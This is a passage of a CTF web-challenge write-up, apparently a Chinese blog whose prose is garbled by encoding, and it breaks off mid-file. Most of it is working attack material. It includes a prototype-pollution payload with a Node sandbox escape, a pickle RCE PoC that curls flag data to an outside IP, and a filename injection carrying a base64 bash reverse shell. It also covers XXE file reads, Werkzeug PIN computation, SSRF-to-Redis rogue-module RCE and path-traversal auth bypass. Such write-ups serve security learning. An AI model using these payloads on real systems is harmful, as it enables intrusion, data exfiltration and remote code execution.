class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">clone</span>(req.<span class="property">body</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; password === users[username]) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params">source</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, source)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–usernameå’Œpasswordæ—¶è°ƒç”¨äº†<code>merge()</code>æ–¹æ³•ï¼Œå¾ˆå…¸å‹çš„ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“æ¨¡å‹</p><p><strong>payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/register</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">/login</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç™»å½•åæ˜¯ä¸ªæ²™ç®±</p><p>åœ¨è°ƒç”¨e.messageæ—¶ä¼šè§¦å‘æ²™ç®±å†…çš„toStringæ–¹æ³•ä»è€Œè§¦å‘Proxyã€‚å‚è€ƒ<a href="https://xz.aliyun.com/t/11859#toc-4">https://xz.aliyun.com/t/11859#toc-4</a></p><p><a href="https://imgse.com/i/piQTrP1"><img src="https://z1.ax1x.com/2023/11/05/piQTrP1.png" alt="piQTrP1.png"></a></p><p>è¿‡æ»¤å¯ä»¥ç”¨æ•°ç»„ç»•</p><p><strong>payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;throw new Proxy(&#123;&#125;, &#123;get: function()&#123;const cc = arguments.callee.caller;const p = (cc.constructor.constructor(&#x27;return process&#x27;))();return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString();&#125;&#125;)&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQTy26"><img src="https://z1.ax1x.com/2023/11/05/piQTy26.png" alt="piQTy26.png"></a></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h3><p>pickleååºåˆ—åŒ–</p><p>ååºåˆ—åŒ–å¯¹åº”çš„å†…å®¹ä¸ºidæ‰€å¯¹åº”çš„éƒ¨åˆ†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;notes&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span>&#x27;c480653f-ab57<span class="number">-4865</span><span class="number">-8</span>b9f-c305d3bc2f39&#x27;<span class="punctuation">:</span> &#x27;content&#x27;<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQT6xK"><img src="https://z1.ax1x.com/2023/11/05/piQT6xK.png" alt="piQT6xK.png"></a></p><p>secret-keyä¸ºéšæœºå°å†™å››ä½æ•°.0-9,a-f</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure><p>ç”¨flask-unsignè·‘secret-key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie .eJw1il0LgjAAAP9K7H0gmzMn-GBL02oE-ZW-NW2azApKrMT_nhEdHNzDDeByfZzuwBpAoZuaQbCER0HmUDcNAk1BJSywRkosCiQx_X4zASxQOWGyd_4wzjwqRerdhKJSBb0btVTL8zBSrF0oH8WboPcOiNQiTePGyZ684ZO7qWuZIdqVq6Qr1yFnS_fF3z-Vn5y3lW2DcRw_TIY0Rw.ZS9C3Q.IQisYtttEp1HxZO9wVsK7ePvlDQ  --wordlist 4.txt --no-literal-eval</span><br></pre></td></tr></table></figure><p><strong>poc</strong>(æ­¤å¤„æ³¨æ„linuxå’Œwindowsçš„å‘½ä»¤å‡½æ•°å·®å¼‚ï¼Œå¯¹åº”ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®æ˜¯ä¸ä¸€æ ·çš„)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http:/xx.xx.xx.xx:2333/`cat /flag`&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"></span><br><span class="line">poc = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line"><span class="comment"># pickle.loads(poc)</span></span><br></pre></td></tr></table></figure><p>ä¼ªé€ session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;d886&#x27;</span> -t <span class="string">&quot;&#123;&#x27;notes&#x27;: &#123;&#x27;c480653f-ab57-4865-8b9f-c305d3bc2f39&#x27;: b&#x27;\x80\x04\x95a\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8cE__import__(\&#x27;os\&#x27;).system(\&#x27;curl http://82.156.156.83:2333/\`cat /flag\`\&#x27;)\x94\x85\x94R\x94.&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>æ”¹sessionè§¦å‘</p><p><a href="https://imgse.com/i/piQTgKO"><img src="https://z1.ax1x.com/2023/11/05/piQTgKO.png" alt="piQTgKO.png"></a></p><h3 id="rss-parser"><a href="#rss-parser" class="headerlink" title="rss_parser"></a>rss_parser</h3><p>xxeä»»æ„æ–‡ä»¶è¯»ï¼Œæ³¨æ„æ»¡è¶³rssæ ¼å¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p>è¿œç¨‹æœåŠ¡å™¨æ”¾ç½®ï¼š1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">title</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">title</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">xmlns:atom</span>=<span class="string">&quot;http://www.w3.org/2005/Atom&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xxe inject<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xxxxx/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xxxxx/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQT2rD"><img src="https://z1.ax1x.com/2023/11/05/piQT2rD.png" alt="piQT2rD.png"></a></p><p>app.pyä¸­å‘ç°å¼€äº†debugæ¨¡å¼ï¼Œç»“åˆä»»æ„æ–‡ä»¶è¯»ï¼Œç®—pinç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>  <span class="comment"># /etc/passwd æœ¬é¢˜ä¸ºapp</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:14:00:02&quot;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>)),  <span class="comment"># /sys/class/net/eth0/address åè¿›åˆ¶</span></span><br><span class="line">    <span class="string">&#x27;5dcbb593-2656-4e8e-a4e9-9a0afb803c47&#x27;</span></span><br><span class="line">    <span class="comment"># å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_id 2. /proc/self/cgroup æœ¬é¢˜åªæœ‰/proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>ç®—å‡ºpinç ï¼Œdebugæ¨¡å¼rceè¯»flag</p><p><a href="https://imgse.com/i/piQTfVH"><img src="https://z1.ax1x.com/2023/11/05/piQTfVH.png" alt="piQTfVH.png"></a></p><h3 id="zip-file-manager"><a href="#zip-file-manager" class="headerlink" title="zip_file_manager"></a>zip_file_manager</h3><p>è§£å‹åŠŸèƒ½ç›´æ¥ä½¿ç”¨<code>os.system()</code>ï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥</p><p><a href="https://imgse.com/i/piQT4IA"><img src="https://z1.ax1x.com/2023/11/05/piQT4IA.png" alt="piQT4IA.png"></a></p><p>æ„é€ ä¸Šä¼ æ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.zip || echo YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMTU2LjgzLzIzMzMgMD4mMQ== || 1.zip</span><br></pre></td></tr></table></figure><p>è§¦å‘unzipï¼Œåå¼¹shell</p><p><a href="https://imgse.com/i/piQTIPI"><img src="https://z1.ax1x.com/2023/11/05/piQTIPI.png" alt="piQTIPI.png"></a></p><h3 id="web-snapshot"><a href="#web-snapshot" class="headerlink" title="web_snapshot"></a>web_snapshot</h3><p>ssrfæ‰“æœªæˆæƒredisä¸»ä»å¤åˆ¶rce</p><p>å¼€å¯äº†<code>curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);</code>,æ”¯æŒé‡å®šå‘</p><p><code>httpå’Œhttps</code>ç”¨<code>Location</code>ç»•</p><p><strong>302.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dict://db:6379/info&#x27;</span>); <span class="comment">#æ³¨æ„è¿™é‡Œéœ€è¦ä½¿ç”¨db</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ7Vo9"><img src="https://z1.ax1x.com/2023/11/05/piQ7Vo9.jpg" alt="piQ7Vo9.jpg"></a></p><p>éƒ¨ç½²æ¶æ„redisï¼ŒåŠ è½½æ¶æ„soï¼Œé¡¹ç›®å‚è€ƒï¼š<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p>å¼€å¯æ¶æ„redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-rogue-server.py --server-only</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ7mJ1"><img src="https://z1.ax1x.com/2023/11/05/piQ7mJ1.jpg" alt="piQ7mJ1.jpg"></a></p><p>ç„¶åä¾æ¬¡æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#è®¾ç½®å¤‡ä»½æ–‡ä»¶å</span><br><span class="line">header(&#x27;Location: dict://db:6379/config:set:dbfilename:exp.so&#x27;);</span><br><span class="line"></span><br><span class="line">#è¿æ¥æ¶æ„RedisæœåŠ¡å™¨</span><br><span class="line">header(&#x27;Location: dict://db:6379/slaveof:82.156.156.83:21000&#x27;);</span><br><span class="line"></span><br><span class="line">#åŠ è½½æ¶æ„æ¨¡å—</span><br><span class="line">header(&#x27;Location: dict://db:6379/module:load:./exp.so&#x27;);</span><br><span class="line"></span><br><span class="line">#å…³é—­ä¸»ä»å¤åˆ¶</span><br><span class="line">header(&#x27;Location: dict://db:6379/slaveof:no:one&#x27;);</span><br><span class="line"></span><br><span class="line">#æ‰§è¡Œå‘½ä»¤</span><br><span class="line">header(&#x27;Location: dict://db:6379/system.exec:env&#x27;);</span><br></pre></td></tr></table></figure><p>ä¸èƒ½åå¼¹shellï¼Œç¯å¢ƒå˜é‡é‡Œè·å¾—flag</p><p><a href="https://imgse.com/i/piQ7MQK"><img src="https://z1.ax1x.com/2023/11/05/piQ7MQK.jpg" alt="piQ7MQK.jpg"></a></p><h3 id="GoShop"><a href="#GoShop" class="headerlink" title="GoShop"></a>GoShop</h3><p>ç®€å•çš„æ•´æ•°æº¢å‡º</p><p><a href="https://imgse.com/i/piQ7QsO"><img src="https://z1.ax1x.com/2023/11/05/piQ7QsO.jpg" alt="piQ7QsO.jpg"></a></p><p>å…ˆä¹°900000â€¦â€¦ä¸ªè‹¹æœï¼Œç„¶åå†å–æ‰å°±æœ‰è¶³å¤Ÿçš„é’±ä¹°flagäº†</p><p><a href="https://imgse.com/i/piQ78dH"><img src="https://z1.ax1x.com/2023/11/05/piQ78dH.jpg" alt="piQ78dH.jpg"></a></p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><p><strong>heapdumpæ³„éœ²å †æ ˆä¿¡æ¯</strong></p><p><code>http://124.71.184.68:50041/actuator/heapdump</code>ä¸‹è½½æ–‡ä»¶</p><p>åˆ©ç”¨<a href="https://github.com/whwlsfb/JDumpSpider%E6%81%A2%E5%A4%8D">https://github.com/whwlsfb/JDumpSpideræ¢å¤</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar &#x27;.\heapdump&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ7YFA"><img src="https://z1.ax1x.com/2023/11/05/piQ7YFA.jpg" alt="piQ7YFA.jpg"></a></p><h3 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth_bypass"></a>auth_bypass</h3><p>urlç¼–ç ç»•è¿‡downloadé‰´æƒ</p><p>ä»»æ„æ–‡ä»¶è¯»å‘ç°å­˜åœ¨<code>/readflag</code>ï¼Œéœ€å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://124.71.184.68:50042/%64%6f%77%6e%6c%6f%61%64?filename=../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br><span class="line">web.xml</span><br></pre></td></tr></table></figure><p><strong>web.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 